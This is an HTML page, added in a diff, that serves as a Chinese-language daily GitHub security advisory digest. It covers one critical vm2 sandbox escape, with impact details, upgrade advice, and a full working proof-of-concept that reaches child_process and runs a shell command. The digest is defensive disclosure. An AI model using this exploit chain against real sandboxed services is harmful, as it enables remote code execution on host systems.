@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub安全公告日报 - 2026-08-31</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Microsoft YaHei', sans-serif;
+            background: #0d1117; color: #c9d1d9; min-height: 100vh; line-height: 1.6;
+        }
+        header {
+            background: linear-gradient(135deg, #161b22 0%, #0d1117 100%);
+            border-bottom: 1px solid #30363d; padding: 40px 20px; text-align: center;
+        }
+        header h1 { font-size: 2em; color: #f0f6fc; margin-bottom: 8px; }
+        header p { color: #8b949e; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 30px 20px; }
+        
+        .stats-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 16px; margin-bottom: 30px;
+        }
+        .stat-card {
+            background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+            padding: 20px; text-align: center;
+        }
+        .stat-number { font-size: 2.5em; font-weight: bold; color: #58a6ff; }
+        .stat-label { color: #8b949e; font-size: 0.9em; margin-top: 4px; }
+        
+        .section-title {
+            font-size: 1.5em; color: #f0f6fc; margin: 30px 0 20px;
+            padding-bottom: 8px; border-bottom: 1px solid #21262d;
+        }
+        
+        .advisory-card {
+            background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+            padding: 24px; margin-bottom: 20px; border-left: 4px solid #30363d;
+        }
+        .advisory-card.critical { border-left-color: #f85149; }
+        .advisory-card.high { border-left-color: #d29922; }
+        .advisory-card.medium { border-left-color: #8b949e; }
+        
+        .advisory-header {
+            display: flex; justify-content: space-between; align-items: start;
+            margin-bottom: 16px; flex-wrap: wrap; gap: 12px;
+        }
+        .advisory-title { font-size: 1.2em; color: #f0f6fc; }
+        .advisory-id { color: #58a6ff; font-family: monospace; font-size: 0.85em; }
+        
+        .badge {
+            display: inline-block; padding: 4px 12px; border-radius: 20px;
+            font-size: 0.8em; font-weight: 600; margin-right: 8px; margin-bottom: 8px;
+        }
+        .badge-critical { background: #da363322; color: #f85149; border: 1px solid #da363344; }
+        .badge-high { background: #d2992222; color: #d29922; border: 1px solid #d2992244; }
+        .badge-stars { background: #d2992222; color: #d29922; border: 1px solid #d2992244; }
+        .badge-poc { background: #da363322; color: #f85149; border: 1px solid #da363344; }
+        .badge-analysis { background: #388bfd22; color: #58a6ff; border: 1px solid #388bfd44; }
+        
+        .advisory-meta { margin-bottom: 16px; }
+        .advisory-content { color: #8b949e; margin-bottom: 16px; }
+        .advisory-content strong { color: #c9d1d9; }
+        .advisory-content ul { margin-left: 20px; margin-top: 8px; }
+        .advisory-content li { margin-bottom: 6px; }
+        
+        .priority-score {
+            display: inline-block; padding: 6px 14px; border-radius: 6px;
+            font-size: 0.85em; font-weight: 600; background: #388bfd22;
+            color: #58a6ff; border: 1px solid #388bfd44;
+        }
+        
+        .summary-table {
+            width: 100%; border-collapse: collapse; margin-top: 20px;
+            background: #161b22; border-radius: 8px; overflow: hidden;
+        }
+        .summary-table th {
+            background: #21262d; color: #f0f6fc; padding: 12px; text-align: left;
+            font-size: 0.85em; text-transform: uppercase;
+        }
+        .summary-table td { padding: 12px; border-top: 1px solid #30363d; }
+        .summary-table tr:hover { background: #1c2128; }
+        
+        footer {
+            text-align: center; padding: 30px; color: #484f58; border-top: 1px solid #21262d;
+            margin-top: 40px; font-size: 0.85em;
+        }
+        footer a { color: #58a6ff; text-decoration: none; }
+        
+        .poc-code {
+            background: #0d1117; border: 1px solid #30363d; border-radius: 6px;
+            padding: 16px; margin: 12px 0; overflow-x: auto;
+            font-family: 'Fira Code', 'Consolas', monospace; font-size: 0.85em;
+            color: #c9d1d9; line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🛡️ GitHub 安全公告日报</h1>
+        <p>2026-08-31 · 监控最近24小时 Critical & High 级别安全公告</p>
+    </header>
+    
+    <div class="container">
+        <!-- 监控概况 -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number">1</div>
+                <div class="stat-label">总公告数</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" style="color:#f85149">1</div>
+                <div class="stat-label">Critical</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">0</div>
+                <div class="stat-label">High</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">0</div>
+                <div class="stat-label">Star≥5k 项目</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" style="color:#f85149">1</div>
+                <div class="stat-label">含PoC/详细分析</div>
+            </div>
+        </div>
+        
+        <!-- 漏洞详情 -->
+        <h2 class="section-title">🚨 需要关注的漏洞（按优先级排序）</h2>
+        
+        <!-- vm2 沙箱逃逸 -->
+        <div class="advisory-card critical">
+            <div class="advisory-header">
+                <div>
+                    <div class="advisory-title">🔴 vm2: 使用危险的 Host Proto Mutators 实现沙箱逃逸</div>
+                    <div class="advisory-id">GHSA-cfcw-xp6x-25gj | CVE: CVE-2026-47698</div>
+                </div>
+                <span class="priority-score">优先级: 高</span>
+            </div>
+            
+            <div class="advisory-meta">
+                <span class="badge badge-critical">Critical (CVSS 9.8)</span>
+                <span class="badge badge-stars">⭐ 4,093</span>
+                <span class="badge badge-poc">🔴 PoC Available</span>
+            </div>
+            
+            <div class="advisory-content">
+                <p><strong>漏洞描述：</strong>VM2 存在沙箱逃逸漏洞。此前针对 GHSA-v6mx-mf47-r5wg 的修复不完整，攻击者可通过将 <code>indirectcall.call(dangerousmutator, ...)</code> 替换为 <code>indirectcall.call(indirectcall, dangerousmutator, ...)</code> 来绕过修复，因为间接调用不被视为危险操作。攻击者可在 VM2 沙箱内执行任意代码并逃逸到宿主系统。</p>
+                
+                <p><strong>影响产品：</strong>vm2 (npm) ⭐ 4,093</p>
+                <p><strong>影响版本：</strong>&lt;= 3.11.5</p>
+                <p><strong>修复版本：</strong>3.11.6</p>
+                <p><strong>攻击面：</strong>任何使用 VM2 运行不可信 JavaScript 代码的应用场景，包括在线代码执行平台、插件系统、CI/CD 管道中的脚本执行等。</p>
+                <p><strong>触发条件：</strong>攻击者能够在 VM2 沙箱内执行任意 JavaScript 代码即可触发。无需任何用户交互或额外权限。</p>
+                <p><strong>潜在危害：</strong>远程代码执行（RCE）— 攻击者可完全控制宿主系统，执行任意系统命令，窃取敏感数据，横向移动至内网其他系统。CVSS 评分 9.8（网络/低复杂度/无需权限/无需交互）。</p>
+                <p><strong>可利用性：</strong>有完整 PoC 代码，可直接复制执行。利用链清晰：通过 <code>__lookupGetter__</code>/<code>__lookupSetter__</code> 获取 <code>__proto__</code> 的 getter/setter，利用 <code>WebAssembly.compileStreaming</code> 异常触发原型链污染，最终通过 <code>constructor.constructor</code> 获取 <code>process</code> 对象执行系统命令。</p>
+                <p><strong>CWE分类：</strong>CWE-913 - 对动态管理代码资源的不当控制</p>
+                
+                <p><strong>PoC 代码：</strong></p>
+                <div class="poc-code"><pre>const {VM} = require(".");
+const vm = new VM();
+console.log(vm.run(`
+const getProto = Buffer.call.call(Buffer.call, 
+  {}.__lookupGetter__, Buffer, "__proto__");
+const setProto = Buffer.call.call(Buffer.call, 
+  {}.__lookupSetter__, Buffer, "__proto__");
+
+async function f() {
+  try {
+    await WebAssembly.compileStreaming();
+  } catch(e) {
+    Buffer.call.call(Buffer.call, setProto, 
+      Buffer.call.call(Buffer.call, getProto, e), null);
+  }
+
+  try {
+    await WebAssembly.compileStreaming();
+  } catch(e) {
+    e.constructor.constructor("return process")()
+      .mainModule.require('child_process')
+      .execSync('touch pwned');
+  }
+}
+
+f();
+`));</pre></div>
+                
+                <p><strong>修复建议：</strong></p>
+                <ul>
+                    <li>立即升级 vm2 至 <strong>3.11.6</strong> 或更高版本</li>
+                    <li>如果无法立即升级，考虑迁移到 <a href="https://github.com/nicedayzhu/vm2" style="color:#58a6ff">nicedayzhu/vm2</a>（社区维护分支）或使用 <a href="https://github.com/nicedayzhu/vm2" style="color:#58a6ff">isolated-vm</a> 替代方案</li>
+                    <li>审查所有使用 VM2 的代码路径，确保不处理来自不可信来源的输入</li>
+                    <li>考虑在容器化环境中运行 VM2 作为纵深防御措施</li>
+                </ul>
+            </div>
+            
+            <a href="https://github.com/advisories/GHSA-cfcw-xp6x-25gj" style="color:#58a6ff;text-decoration:none;font-size:0.9em;">查看完整公告 →</a>
+        </div>
+        
+        <!-- 汇总表 -->
+        <h2 class="section-title">📊 漏洞清单汇总表</h2>
+        <table class="summary-table">
+            <thead>
+                <tr>
+                    <th>序号</th>
+                    <th>评级</th>
+                    <th>GHSA编号</th>
+                    <th>影响产品</th>
+                    <th>Star数</th>
+                    <th>严重级别</th>
+                    <th>可利用性</th>
+                    <th>产品影响力</th>
+                    <th>链接</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>1</td>
+                    <td>🔴 紧急</td>
+                    <td style="font-family:monospace;font-size:0.85em;">GHSA-cfcw-xp6x-25gj</td>
+                    <td>vm2 (npm)</td>
+                    <td>4,093</td>
+                    <td><span class="badge badge-critical" style="margin:0">Critical</span></td>
+                    <td>完整PoC</td>
+                    <td>中</td>
+                    <td><a href="https://github.com/advisories/GHSA-cfcw-xp6x-25gj" style="color:#58a6ff">GitHub</a></td>
+                </tr>
+            </tbody>
+        </table>
+        
+        <!-- 补充：Star < 5k 但含完整 PoC -->
+        <h2 class="section-title">📌 补充：Star &lt; 5k 但含完整 PoC 的高价值漏洞</h2>
+        <table class="summary-table">
+            <thead>
+                <tr>
+                    <th>GHSA编号</th>
+                    <th>影响产品</th>
+                    <th>Star</th>
+                    <th>级别</th>
+                    <th>亮点</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td style="font-family:monospace;font-size:0.85em;">GHSA-cfcw-xp6x-25gj</td>
+                    <td>vm2 (npm)</td>
+                    <td>4,093</td>
+                    <td><span class="badge badge-critical" style="margin:0">Critical</span></td>
+                    <td>沙箱逃逸 RCE，完整利用链可直接执行系统命令，CVSS 9.8</td>
+                </tr>
+            </tbody>
+        </table>
+        
+        <!-- 总结与建议 -->
+        <h2 class="section-title">📝 总结与建议</h2>
+        <div class="advisory-card">
+            <div class="advisory-content">
+                <p><strong>🔴 紧急关注：</strong></p>
+                <ul>
+                    <li><strong>vm2 沙箱逃逸（GHSA-cfcw-xp6x-25gj）</strong>：CVSS 9.8 的严重漏洞，有完整可用的 PoC。此前针对 GHSA-v6mx-mf47-r5wg 的修复被绕过。所有使用 VM2 &lt;= 3.11.5 的项目应立即升级至 3.11.6。VM2 广泛用于在线代码执行、插件沙箱等场景，影响面较大。</li>
+                </ul>
+                
+                <p><strong>🟠 重点关注：</strong></p>
+                <ul>
+                    <li>今日暂无 High 级别且 Star≥5k 的漏洞公告。</li>
+                </ul>
+                
+                <p><strong>🟡 常规关注：</strong></p>
+                <ul>
+                    <li>过去 24 小时内仅有 1 条 Critical/High 级别公告被更新，整体活跃度较低。</li>
+                    <li>建议持续关注 vm2 生态动态，该项目历史上多次出现沙箱逃逸漏洞。</li>
+                </ul>
+                
+                <p style="margin-top:16px"><strong>📋 监控说明：</strong></p>
+                <ul>
+                    <li>监控时间窗口：2026-08-30 00:10 UTC ~ 2026-08-31 00:10 UTC</li>
+                    <li>数据源：GitHub Advisory Database (reviewed type)</li>
+                    <li>筛选条件：severity ∈ {critical, high}，按 updated_at 过滤最近 24 小时</li>
+                    <li>API 返回 100 条公告中，1 条在 24 小时内更新且为 Critical/High 级别</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <p>每日 08:10 自动生成 · 数据来源: GitHub Advisory Database</p>
+        <p><a href="https://github.com/JsHuang/sec-advisory-daily">GitHub 仓库</a></p>
+    </footer>
+</body>
+</html>
